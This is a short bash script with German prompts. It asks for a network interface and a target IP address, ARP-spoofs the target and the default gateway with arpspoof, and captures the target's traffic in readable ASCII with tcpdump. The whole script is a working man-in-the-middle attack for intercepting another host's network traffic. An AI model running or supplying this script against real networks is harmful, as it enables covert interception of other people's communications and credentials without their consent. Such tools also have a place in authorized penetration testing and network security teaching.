#!/bin/bash

set -ex

if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi

read -p "Wie heisst die Schnittstelle? [enp30s0\eth0] : " modul
read -p "Wie heisst die IP? : " ip

gateway=$(route -n|grep ^0.0.0.0|cut -d' ' -f 10)

arpspoof -i $modul -t $ip -r $gateway &

tcpdump -i $modul -A host $ip
